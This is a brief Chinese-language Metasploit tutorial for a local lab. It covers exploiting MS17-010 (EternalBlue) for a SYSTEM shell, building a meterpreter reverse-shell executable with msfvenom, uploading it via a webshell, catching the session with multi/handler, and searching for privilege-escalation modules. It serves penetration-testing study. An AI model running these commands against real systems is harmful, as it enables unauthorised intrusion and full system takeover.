MSF框架使用


由于本地搭建的环境有一定型，所以只有个MS17-010 漏洞 这种是永恒之蓝，不需要传木马，直接在msf搜索改模块就可以获取系统shell。

search ms17-010use 2  # 输入对应的序号就可以了


使用 show options 查看详细信息上面的框框 是目标主机的ip 下面的框 是msf的ip 和 反弹的端口 默认即可set rhost 10.0.0.100run

getuid 查看当前权限直接system权限



msf 查找可提权的模块

生成木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.10 lport=1234 -f exe -o msf.exe


通过webshell 上传木马

msf 开启监听

use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 10.0.0.10set lport 1234run


因为是webshell上传的木马 获取的权限是administrator  

msf自带一个模块可以查找提权的模块

suggester模块
backgroup 返回命令行 
search suggester
查看详细信息 有个session设置 因为刚才得到了admin权限的shell 我使用backgroup会把shell保存到一个session默认为会话1 然后设置会话为1

输入session 可以看到历史会话


运行之后 这些绿色的模块就可以尝试下了。
